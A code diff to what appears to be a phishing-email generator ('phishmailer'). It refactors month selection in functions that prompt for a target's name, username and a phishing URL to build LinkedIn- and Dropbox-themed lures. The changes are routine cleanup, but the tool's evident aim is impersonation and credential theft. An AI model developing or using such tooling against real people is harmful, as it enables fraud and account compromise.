@@ -14,7 +14,7 @@ def Custom():
 	global Browser
 	
 	print("")
-	print(start + " /Custom Pick\ ")
+	print(start + " /Custom Pick\\ ")
 	print(alert + " Enter Browser")
 	print("")
 	Browser = input(green + "root@phishmailer/Device/Custom:~ ")
@@ -75,9 +75,6 @@ def AllNeed():
 		Device = ("Windows")
 
 def Linkedin():
-	print(monthName(1))
-
-	pass
 	Name = input(start + " Enter Target Name: ")
 	username = input(start + " Enter Target Username: ")
 	Url = input(start + " Enter Your PhishingUrl: ")
@@ -101,36 +98,7 @@ def Linkedin():
 	print(green + "[" + white + "12" + green + "]" + white + " December")
 	print("")
 	monthpick = int(input(green + "root@phishmailer/month:~ " + white))
-	
-	if monthpick == 1:
-		month = ("January")
-	elif monthpick == 2:
-		month = ("February")
-	elif monthpick == 3:
-		month = ("March")
-	elif monthpick == 4:
-		month = ("April")
-	elif monthpick == 5:
-		month = ("May")
-	elif monthpick == 6:
-		month = ("June")
-	elif monthpick == 7:
-		month = ("July")
-	elif monthpick == 8:
-		month = ("August")
-	elif monthpick == 9:
-		month = ("September")
-	elif monthpick == 10:
-		month ("October")
-	elif monthpick == 11:
-		month = ("November")
-	elif month == 12:
-		month = ("December")
-	else:
-		print(alert + " Error")
-		time.sleep(1)
-		print(alert + " Exiting")
-		sys.exit()
+	month = monthName(monthpick)
 	
 	AllNeed()
 	
@@ -299,36 +267,7 @@ def Dropbox():
 	print(green + "[" + white + "12" + green + "]" + white + " December")
 	print("")
 	monthpick = int(input(green + "root@phishmailer/month:~ " + white))
-	
-	if monthpick == 1:
-		month = ("January")
-	elif monthpick == 2:
-		month = ("February")
-	elif monthpick == 3:
-		month = ("March")
-	elif monthpick == 4:
-		month = ("April")
-	elif monthpick == 5:
-		month = ("May")
-	elif monthpick == 6:
-		month = ("June")
-	elif monthpick == 7:
-		month = ("July")
-	elif monthpick == 8:
-		month = ("August")
-	elif monthpick == 9:
-		month = ("September")
-	elif monthpick == 10:
-		month ("October")
-	elif monthpick == 11:
-		month = ("November")
-	elif month == 12:
-		month = ("December")
-	else:
-		print(alert + " Error")
-		time.sleep(1)
-		print(alert + " Exiting")
-		sys.exit()
+	month = monthName(monthpick)
 	
 	print("")
 	Year = input(start + " Enter Year: ")
